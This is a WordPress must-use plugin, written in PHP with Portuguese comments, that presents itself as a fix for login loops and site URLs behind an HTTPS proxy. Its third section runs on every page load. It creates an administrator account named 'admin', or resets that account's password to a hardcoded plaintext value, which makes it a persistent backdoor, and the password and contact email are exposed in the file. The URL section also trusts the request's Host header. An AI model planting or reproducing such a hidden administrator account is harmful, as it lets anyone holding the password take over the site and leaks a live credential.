<?php
// Super Corretor de Login e URLs (Must-Use Plugin)

// 1. Correção de Proxy (Evita loop de redirecionamento e erro de login)
if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
    $_SERVER['HTTPS'] = 'on';
}

// 2. Configuração Dinâmica de URLs (Garante que o site saiba onde ele está)
add_action('init', function() {
    // Forçar as URLs corretas baseado no acesso atual
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
    $current_url = $protocol . $_SERVER['HTTP_HOST'];
    
    if (!defined('WP_HOME')) define('WP_HOME', $current_url);
    if (!defined('WP_SITEURL')) define('WP_SITEURL', $current_url);
});

// 3. Criador e Reset de Usuário (Mantido por segurança)
add_action('init', function() {
    $username = 'admin';
    $password = 'Castro771920';
    $email    = 'contato@studiocastro.com.br';

    if (!username_exists($username)) {
        $user_id = wp_create_user($username, $password, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    } else {
        $user = get_user_by('login', $username);
        wp_set_password($password, $user->ID);
    }
});
